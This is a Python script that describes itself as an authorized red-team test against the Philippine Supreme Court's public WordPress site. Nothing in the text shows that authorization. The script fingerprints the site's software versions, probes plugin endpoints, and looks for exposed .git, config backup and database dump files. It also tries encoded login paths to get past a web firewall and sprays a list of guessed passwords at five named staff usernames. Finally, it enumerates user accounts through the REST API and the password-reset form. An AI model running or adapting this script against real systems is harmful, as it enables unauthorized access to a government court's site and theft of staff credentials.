#!/usr/bin/env python3
"""Phase 2 offensive tests — sc.judiciary.gov.ph (authorized red team)."""

import json
import re
import time
from datetime import datetime, timezone

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

BASE = 'https://sc.judiciary.gov.ph'
UA = (
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
    'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
)
HEADERS = {'User-Agent': UA, 'Accept': '*/*'}

USERS = ['scweb', 'pio_tyke', 'pio_jerome', 'tyke-test-admin', 'pio_rus']

PASSWORDS_EXTRA = [
    'scweb123', 'Scweb@123', 'SCweb2024!', 'SCweb2025!', 'scweb2024', 'scweb2025',
    'Judiciary@123', 'judiciary@123', 'SupremeCourt@123', 'SCJudiciary123!',
    'Pio_tyke123', 'pio_tyke123', 'PioTyke2024', 'jerome123', 'Jerome123!',
    'RusNarito123', 'rus123', 'TykeFlores123!', 'tyke2024', 'tyke2025', 'Tyke@2024',
    'Welcome123', 'Welcome1!', 'Changeme123', 'Temp1234!', 'Default123', 'Setup123',
    'Wordpress@123', 'WpAdmin123!', 'Admin@2024', 'Admin@2025', 'Admin2024!', 'Admin2025!',
    'Philippines123', 'Manila@123', 'SC@2024', 'SC@2025', 'sc@2024', 'sc@2025',
    'Pass1234!', 'Pass@1234', 'Qwerty123!', 'Abc12345!', 'Test1234!', 'Demo1234!',
    'Password@1', 'Password@123', 'P@ssw0rd123', 'P@ssword123', 'Welcome@123',
    'Summer@2024', 'Winter@2024', 'Spring@2025', 'Fall@2024', 'January2025',
    'scweb!', 'scweb1', 'scweb12', 'scweb1234', '1234scweb', 'scweb@2024',
    'tyke-test-admin!', 'tyke-test-admin1', 'Tyke-test-admin123', 'TykeTestAdmin1',
    'testadmin', 'Test@123', 'admin@sc', 'scadmin', 'SCAdmin123', 'webmaster',
    'Webmaster123', 'webmaster123', 'info@sc', 'support123', 'Helpdesk123',
]

BYPASS_PATHS_EXTRA = [
    '/wp-login.php',
    '/wp%2Dlogin.php',
    '/wp%252Dlogin.php',
    '/wp%2Dlogin%2ephp',
    '/wp-login%2ephp',
    '/%77p-login.php',
    '/wp-login.php/..;/wp-login.php',
    '/wp-login.php/..%2fwp-login.php',
    '/wp-login.php%3frest_route=/',
    '/wp-login.php%23',
    '/wp-login.php%3b',
    '/wp-login.php%2f',
    '/wp-login.php%5c',
    '/wp%2Dlogin.php%3f',
    '/wp%2Dlogin.php%23',
    '/wp-login.php?reauth=1',
    '/wp-login.php?interim-login=1',
    '/wp-login.php?action=lostpassword',
    '/wp%2Dlogin.php?action=lostpassword',
    '/wp-login.php?action=rp',
    '/wp-login.php?action=register',
    '/wp-login.php?loggedout=true',
    '/wp-login.php?redirect_to=https%3A%2F%2Fsc.judiciary.gov.ph%2Fwp-admin%2F',
    '/wp-login.php?redirect_to=https%3A%2F%2Fsc.judiciary.gov.ph%2Fwp-admin%2F&reauth=1',
    '/wp-admin/install.php',
    '/wp-admin/setup-config.php',
    '/wp-admin/upgrade.php',
    '/wp-admin/maint/repair.php',
]

ELEMENTOR_CHECKS = [
    ('GET', '/wp-json/elementor/v1/globals'),
    ('GET', '/wp-json/elementor/v1/kit-elements-defaults'),
    ('GET', '/wp-json/elementor/v1/site-navigation'),
    ('GET', '/wp-json/elementor/v1/user-data'),
    ('POST', '/wp-admin/admin-ajax.php', {'action': 'elementor_ajax', 'actions': '{}'}),
    ('POST', '/wp-admin/admin-ajax.php', {'action': 'elementor_get_images_details', 'items': '[]'}),
    ('POST', '/wp-admin/admin-ajax.php', {'action': 'elementor_pro_get_library_token'}),
    ('GET', '/wp-content/plugins/elementor/readme.txt'),
    ('GET', '/wp-content/plugins/elementor-pro/readme.txt'),
    ('GET', '/wp-content/plugins/elementor/changelog.txt'),
    ('GET', '/wp-content/uploads/elementor/css/post-1.css'),
    ('GET', '/wp-content/uploads/elementor/css/'),
]

PLUGIN_CVE_PATHS = [
    '/wp-content/plugins/duplicate-page/readme.txt',
    '/wp-content/plugins/redirection/readme.txt',
    '/wp-content/plugins/redirection/models/log.php',
    '/wp-content/plugins/duplicate-page/duplicatepage.php',
    '/wp-content/plugins/elementor/elementor.php',
    '/wp-content/debug.log',
    '/wp-content/uploads/wpforms/cache/',
    '/.git/HEAD',
    '/.git/config',
    '/wp-content/backups-dup-lite/',
    '/wp-content/ai1wm-backups/',
    '/wp-content/updraft/',
    '/wp-snapshots/',
    '/database.sql',
    '/dump.sql',
    '/wp-config.php.old',
    '/wp-config.bak',
    '/wp-config.txt',
    '/wp-config.php.save',
    '/wp-config.php.swp',
    '/.wp-config.php.swp',
    '/wp-content/mu-plugins/',
    '/wp-content/advanced-cache.php',
    '/wp-content/object-cache.php',
]

THEME_PATHS = [
    '/wp-content/themes/twentytwentyfour/style.css',
    '/wp-content/themes/twentytwentythree/style.css',
    '/wp-content/themes/twentytwentytwo/style.css',
    '/wp-content/themes/twentytwentyone/style.css',
    '/wp-content/themes/twentytwenty/style.css',
    '/wp-content/themes/',
]


def sess():
    s = requests.Session()
    s.verify = False
    s.headers.update(HEADERS)
    return s


def wp_version(s):
    findings = {}
    r = s.get(BASE + '/', timeout=20)
    if r.status_code == 200:
        m = re.search(r'name="generator"\s+content="WordPress\s+([^"]+)"', r.text, re.I)
        if m:
            findings['generator_meta'] = m.group(1)
        m = re.search(r'/wp-includes/css/dist/block-library/style\.min\.css\?ver=([0-9.]+)', r.text)
        if m:
            findings['block_library_ver'] = m.group(1)
    r = s.get(BASE + '/readme.html', timeout=15)
    if r.status_code == 200:
        m = re.search(r'Version\s+([0-9.]+)', r.text)
        if m:
            findings['readme_version'] = m.group(1)
    r = s.get(BASE + '/feed/', timeout=15)
    if r.status_code == 200 and 'generator' in r.text:
        m = re.search(r'<generator>https://wordpress.org/\?v=([0-9.]+)</generator>', r.text)
        if m:
            findings['feed_version'] = m.group(1)
    return findings


def elementor_tests(s):
    results = []
    for item in ELEMENTOR_CHECKS:
        method = item[0]
        path = item[1]
        data = item[2] if len(item) > 2 else None
        try:
            if method == 'GET':
                r = s.get(BASE + path, timeout=15, allow_redirects=False)
            else:
                r = s.post(BASE + path, data=data, timeout=15, allow_redirects=False)
            entry = {
                'method': method,
                'path': path,
                'status': r.status_code,
                'len': len(r.text or ''),
                'content_type': r.headers.get('Content-Type', ''),
            }
            if r.status_code == 200:
                if 'readme' in path or 'changelog' in path:
                    v = re.search(r'Stable tag:\s*([0-9.]+)', r.text, re.I)
                    if v:
                        entry['version'] = v.group(1)
                elif 'json' in entry['content_type']:
                    try:
                        entry['json'] = r.json()
                    except Exception:
                        entry['body_snippet'] = (r.text or '')[:300]
                else:
                    entry['body_snippet'] = (r.text or '')[:300]
            elif r.status_code >= 400:
                entry['body_snippet'] = (r.text or '')[:200]
            results.append(entry)
        except requests.RequestException as e:
            results.append({'path': path, 'error': str(e)[:80]})
        time.sleep(0.15)
    return results


def bypass_retest(s):
    hits = []
    for path in BYPASS_PATHS_EXTRA:
        try:
            r = s.get(BASE + path, timeout=12, allow_redirects=False)
            login = r.status_code == 200 and 'user_login' in (r.text or '').lower()
            if login:
                hits.append({'path': path, 'status': 200, 'type': 'login_page'})
            elif r.status_code not in (403, 404, 400):
                hits.append({'path': path, 'status': r.status_code})
        except requests.RequestException:
            pass
        time.sleep(0.1)
    return hits


def login_spray(s, paths, users, passwords):
    results = {'success': None, 'valid_users': {}, 'attempts': 0, 'blocked': True}
    for path in paths:
        url = BASE + path
        for user in users:
            for pwd in passwords:
                results['attempts'] += 1
                try:
                    r = s.post(url, data={
                        'log': user, 'pwd': pwd, 'wp-submit': 'Log In',
                        'redirect_to': BASE + '/wp-admin/', 'testcookie': '1',
                    }, timeout=15, allow_redirects=False)
                    if r.status_code == 403:
                        continue
                    results['blocked'] = False
                    logged = any('wordpress_logged_in' in c.name for c in s.cookies)
                    redir = r.status_code in (301, 302) and 'wp-admin' in r.headers.get('Location', '')
                    t = (r.text or '').lower()
                    if logged or redir:
                        results['success'] = {'user': user, 'password': pwd, 'path': path}
                        return results
                    if 'incorrect password' in t or 'invalid password' in t or 'the password you entered' in t:
                        results['valid_users'][user] = path
                    s.cookies.clear()
                except requests.RequestException:
                    pass
                time.sleep(0.25)
    return results


def plugin_surface(s):
    results = []
    for path in PLUGIN_CVE_PATHS + THEME_PATHS:
        try:
            r = s.get(BASE + path, timeout=12, allow_redirects=False)
            entry = {'path': path, 'status': r.status_code, 'len': len(r.text or '')}
            if r.status_code == 200 and len(r.text or '') > 0:
                if 'readme.txt' in path or 'style.css' in path:
                    v = re.search(r'(Stable tag|Version):\s*([0-9.]+)', r.text, re.I)
                    if v:
                        entry['version'] = v.group(2)
                if 'debug.log' in path and 'PHP' in (r.text or ''):
                    entry['debug_log_exposed'] = True
                if '.git' in path:
                    entry['git_exposed'] = True
                if entry['len'] < 500:
                    entry['snippet'] = (r.text or '')[:200]
            results.append(entry)
        except requests.RequestException as e:
            results.append({'path': path, 'error': str(e)[:60]})
        time.sleep(0.08)
    return results


def rest_deep_enum(s):
    results = {}
    endpoints = [
        '/wp-json/wp/v2/users?per_page=100',
        '/wp-json/wp/v2/users?roles=administrator',
        '/wp-json/wp/v2/users?who=authors',
        '/wp-json/wp/v2/posts?per_page=1&status=draft',
        '/wp-json/wp/v2/posts?per_page=1&status=private',
        '/wp-json/wp/v2/media?per_page=5',
        '/wp-json/wp/v2/comments?per_page=5',
        '/wp-json/wp/v2/plugins',
        '/wp-json/wp/v2/block-types',
        '/wp-json/oembed/1.0/proxy',
    ]
    for ep in endpoints:
        try:
            r = s.get(BASE + ep, timeout=15)
            entry = {'status': r.status_code, 'len': len(r.text or '')}
            if r.status_code == 200 and 'json' in r.headers.get('Content-Type', ''):
                try:
                    data = r.json()
                    if isinstance(data, list):
                        entry['count'] = len(data)
                        if data and isinstance(data[0], dict):
                            entry['sample_keys'] = list(data[0].keys())[:10]
                    elif isinstance(data, dict):
                        entry['keys'] = list(data.keys())[:10]
                except Exception:
                    pass
            results[ep] = entry
        except requests.RequestException as e:
            results[ep] = {'error': str(e)[:60]}
        time.sleep(0.12)
    return results


def author_email_leak(s):
    """Check if author pages or REST leak emails."""
    leaks = []
    for uid in [1, 2, 16, 204, 205]:
        r = s.get(f'{BASE}/wp-json/wp/v2/users/{uid}', timeout=12)
        if r.status_code == 200:
            data = r.json()
            leaks.append({'id': uid, 'slug': data.get('slug'), 'fields': list(data.keys())})
    return leaks


def main():
    s = sess()
    print('[1/6] WordPress version fingerprint...')
    version = wp_version(s)

    print('[2/6] Elementor + plugin CVE surface...')
    elementor = elementor_tests(s)
    plugins = plugin_surface(s)

    print('[3/6] WAF bypass retest...')
    bypass = bypass_retest(s)
    spray_paths = [h['path'] for h in bypass if h.get('type') == 'login_page']
    if not spray_paths:
        spray_paths = ['/wp-login.php', '/wp%2Dlogin.php']

    print('[4/6] Expanded credential spray...')
    spray = login_spray(s, spray_paths, USERS, PASSWORDS_EXTRA)

    print('[5/6] REST API deep enum...')
    rest = rest_deep_enum(s)
    authors = author_email_leak(s)

    print('[6/6] Password reset on any open login path...')
    reset = {}
    for path in spray_paths[:3]:
        lost = BASE + path + ('&' if '?' in path else '?') + 'action=lostpassword'
        for user in USERS:
            try:
                r = s.post(lost, data={'user_login': user, 'wp-submit': 'Get New Password'}, timeout=15)
                t = (r.text or '').lower()
                if r.status_code == 403:
                    reset[user] = 'blocked'
                elif 'email could not be sent' in t or 'check your email' in t:
                    reset[user] = f'valid_via_{path}'
                elif 'invalid username' in t:
                    reset[user] = 'invalid'
                else:
                    reset[user] = f'status_{r.status_code}'
            except requests.RequestException:
                pass
            time.sleep(0.3)

    report = {
        'meta': {
            'target': BASE,
            'phase': 2,
            'timestamp': datetime.now(timezone.utc).isoformat(),
        },
        'wordpress_version': version,
        'elementor_tests': elementor,
        'plugin_surface': [p for p in plugins if p.get('status') == 200],
        'waf_bypass_hits': bypass,
        'credential_spray': spray,
        'rest_deep_enum': rest,
        'author_leak': authors,
        'password_reset': reset,
    }

    out = 'readyTouse/phase2-offensive.json'
    with open(out, 'w', encoding='utf-8') as f:
        json.dump(report, f, indent=2)

    summary = {
        'wp_version': version,
        'bypass_hits': len(bypass),
        'login_paths_open': spray_paths,
        'credential_success': spray.get('success'),
        'valid_users_via_login': spray.get('valid_users'),
        'spray_attempts': spray.get('attempts'),
        'plugins_200': len([p for p in plugins if p.get('status') == 200]),
        'rest_open': {k: v.get('status') for k, v in rest.items() if v.get('status') == 200},
    }
    print(json.dumps(summary, indent=2))
    print(f'\n[+] Saved: {out}')


if __name__ == '__main__':
    main()
